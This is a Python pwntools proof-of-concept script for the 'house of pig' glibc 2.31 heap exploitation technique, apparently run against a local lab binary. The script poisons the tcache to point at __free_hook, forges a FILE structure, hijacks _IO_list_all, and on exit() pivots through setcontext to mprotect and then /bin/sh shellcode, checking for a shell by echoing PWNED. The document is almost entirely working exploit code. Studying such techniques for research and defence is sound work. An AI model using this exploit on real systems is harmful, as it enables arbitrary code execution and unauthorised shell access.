"""POC for house_of_pig_exec_shellcode (libc 2.31)

Technique: Uses _IO_str_jumps overflow to trigger malloc, which allocates from
tcache poisoned to point to __free_hook - 0x1c0. The gadget at __free_hook
pivots to setcontext for mprotect + shellcode execution.

Requires: __free_hook (libc < 2.34), tcache poisoning
Trigger: exit() -> _IO_flush_all_lockp -> _IO_str_overflow -> malloc -> free
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from pwn import *
from pwncli.utils.io_file import IO_FILE_plus_struct
from helper import *

context.arch = "amd64"
context.log_level = "info"

GLIBC_VERSION = "2.31-0ubuntu9.7"


def exploit():
    io, elf, libc = start(GLIBC_VERSION)

    libc.address = leak_libc_base(io, libc)
    log.success(f"libc base: {hex(libc.address)}")

    __free_hook = libc.sym['__free_hook']
    system = libc.sym['system']
    mprotect = libc.sym['mprotect']
    setcontext = libc.sym['setcontext']

    # _IO_str_jumps is at _IO_file_jumps + 0xc0 in glibc 2.31
    _IO_file_jumps = libc.sym['_IO_file_jumps']
    _IO_str_jumps = _IO_file_jumps + 0xc0
    log.info(f"_IO_str_jumps: {hex(_IO_str_jumps)}")

    # Find the gadget: mov rdx, [rdi + 8]; mov [rsp], rax; call [rdx + 0x20]
    try:
        gadget = next(libc.search(asm("mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]")))
    except StopIteration:
        log.failure("Cannot find gadget")
        io.close()
        return False

    log.info(f"gadget: {hex(gadget)}")
    log.info(f"__free_hook: {hex(__free_hook)}")
    log.info(f"setcontext+61: {hex(setcontext + 61)}")

    # Step 1: Poison tcache bin for size 0x400 to point to __free_hook - 0x1c0
    # _IO_str_overflow will malloc(new_size) where new_size = 2 * (_IO_buf_end - _IO_buf_base) + 100
    # We need this to be 0x400 (or whatever size maps to the tcache bin we poison)
    # Actually, the technique says: fill tcache_perthread_struct[0x400] with __free_hook - 0x1c0
    # This means the tcache bin for chunks of size 0x3f0-0x400 should have __free_hook - 0x1c0

    # For the POC, we'll use the arb_write to directly set up the tcache
    # The tcache_perthread_struct is at the beginning of the heap

    # First, let's figure out the heap base
    chunk0_addr = alloc(io, 1, 0x20)
    heap_base = chunk0_addr - 0x2a0  # approximate, depends on allocations
    # Actually, tcache_perthread_struct is at heap_base + 0x10
    # Let's just read it from /proc/pid/maps
    pid = io.pid
    maps = open(f'/proc/{pid}/maps').read()
    for line in maps.split('\n'):
        if '[heap]' in line:
            heap_base = int(line.split('-')[0], 16)
            break

    log.info(f"heap base: {hex(heap_base)}")

    # tcache_perthread_struct starts at heap_base + 0x10
    # counts[i] at offset i*2 (uint16_t array, 64 entries)
    # entries[i] at offset 0x80 + i*8 (pointer array, 64 entries)
    # tcache bin index for size 0x400: (0x400 - 0x20) / 0x10 - 1 = 0x3e0/0x10 - 1 = 62 - 1 = 61
    # Wait: tcache index = (size - 1) / MALLOC_ALIGNMENT - 1 for sizes > MINSIZE
    # Actually: tc_idx = csize2tidx(size) = (size - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
    # For 64-bit: MINSIZE = 0x20, MALLOC_ALIGNMENT = 0x10
    # tc_idx = (0x400 - 0x20 + 0x10 - 1) / 0x10 = 0x3ef / 0x10 = 62

    # Actually simpler: tcache bin index for request size s:
    # chunk_size = (s + 8 + 15) & ~15 (with minimum 0x20)
    # tc_idx = (chunk_size - 0x20) / 0x10

    # We need malloc to return __free_hook - 0x1c0
    # The _IO_str_overflow calls malloc with size = 2 * (_IO_buf_end - _IO_buf_base) + 100
    # We set _IO_buf_base and _IO_buf_end so that the malloc size hits our poisoned bin

    # Let's target tcache bin for size 0x1e0 (a smaller, more manageable size)
    # Actually, let's just compute: we want malloc to allocate from a bin that returns __free_hook - 0x1c0
    # The simplest approach: set up a fake tcache entry

    # Target chunk size: let's use 0x1f0
    # _IO_buf_end - _IO_buf_base = (target_malloc_size - 100) / 2
    # target_malloc_size should be such that the chunk size matches our tcache bin
    # chunk_size for malloc(n) = (n + 8 + 15) & ~15 (minimum 0x20)
    # Let's target chunk_size = 0x410 (tc_idx = (0x410 - 0x20) / 0x10 = 63)
    # malloc_size for chunk 0x410: n where (n + 8 + 15) & ~15 = 0x410 → n = 0x408
    # But 0x410 > tcache max (0x410 is the max for 64 entries)
    # tc_idx for 0x410 = (0x410 - 0x20) / 0x10 = 63 (last tcache bin)

    # Let's use chunk_size = 0x200 (tc_idx = (0x200 - 0x20) / 0x10 = 30)
    # malloc_size for 0x200: n = 0x1f8
    # 2 * buf_diff + 100 = 0x1f8 → buf_diff = (0x1f8 - 100) / 2 = 0xce

    # Actually, let me re-read the code. The payload sets:
    # _IO_buf_base = fp_heap_addr + 0x110
    # _IO_buf_end = fp_heap_addr + 0x110 + 0x1c8
    # So buf_diff = 0x1c8
    # malloc_size = 2 * 0x1c8 + 100 = 0x390 + 0x64 = 0x3f4
    # chunk_size = (0x3f4 + 8 + 15) & ~15 = 0x400
    # tc_idx = (0x400 - 0x20) / 0x10 = 62

    tc_idx = 62
    tcache_struct = heap_base + 0x10

    # Set count for bin 62 to 1
    count_offset = tc_idx * 2
    # Set entry for bin 62 to __free_hook - 0x1c0
    entry_offset = 0x80 + tc_idx * 8

    log.info(f"Poisoning tcache bin {tc_idx} with {hex(__free_hook - 0x1c0)}")

    # Write count = 1
    arb_write(io, tcache_struct + count_offset, p16(1))
    # Write entry = __free_hook - 0x1c0
    arb_write(io, tcache_struct + entry_offset, p64(__free_hook - 0x1c0))

    # Allocate chunk for fake FILE
    fp_addr = alloc(io, 2, 0x500)
    log.info(f"fake FILE at: {hex(fp_addr)}")

    # Shellcode: execve("/bin/sh", NULL, NULL)
    shellcode = asm(shellcraft.sh())

    fake_file = IO_FILE_plus_struct()
    # The library's house_of_pig_exec_shellcode has an offset mismatch between
    # _IO_buf_base and the payload dict. We build the payload manually.
    fake_file.flags = 0xfbad2800
    fake_file._IO_write_base = 0
    fake_file._IO_write_ptr = 0xffffffffffffff
    fake_file.unknown2 = 0
    fake_file._lock = fp_addr + 0x90
    fake_file.vtable = _IO_str_jumps
    fake_file._IO_buf_base = fp_addr + 0x100
    fake_file._IO_buf_end = fp_addr + 0x100 + 0x1c8

    payload = flat({
        0: fake_file.__bytes__(),
        0x100: {
            0x8: fp_addr + 0x100,       # *(buf+8) = rdx = fp_addr+0x100
            0x20: setcontext + 61,       # *(rdx+0x20) = setcontext+61
            0x68: (fp_addr + 0x100) & ~0xfff,  # *(rdx+0x68) = rdi for mprotect = page-aligned addr
            0x70: 0x2000,                # *(rdx+0x70) = rsi for mprotect = size
            0x88: 7,                     # *(rdx+0x88) = rdx for mprotect = PROT_RWX
            0xa0: fp_addr + 0x300,       # *(rdx+0xa0) = new_rsp (points to shellcode addr)
            0xa8: mprotect,              # *(rdx+0xa8) = ret addr pushed by setcontext = mprotect
            0x1c0: gadget,               # This gets written to __free_hook via memcpy
        },
        0x300: flat(fp_addr + 0x310),    # Return addr after mprotect -> shellcode
        0x310: shellcode,                # Shellcode
    })

    # Write the payload
    edit(io, 2, payload.ljust(0x500, b'\x00'))

    # Point _IO_list_all to our fake FILE
    _IO_list_all = libc.sym['_IO_list_all']
    arb_write(io, _IO_list_all, p64(fp_addr))

    # Trigger via exit
    log.info("Triggering exit()...")
    do_exit(io)

    io.sendline(b"echo PWNED")
    try:
        result = io.recvuntil(b"PWNED", timeout=3)
        if b"PWNED" in result:
            log.success("house_of_pig_exec_shellcode: SUCCESS")
            io.close()
            return True
    except:
        pass

    log.failure("house_of_pig_exec_shellcode: FAILED")
    io.close()
    return False


if __name__ == "__main__":
    result = exploit()
    sys.exit(0 if result else 1)
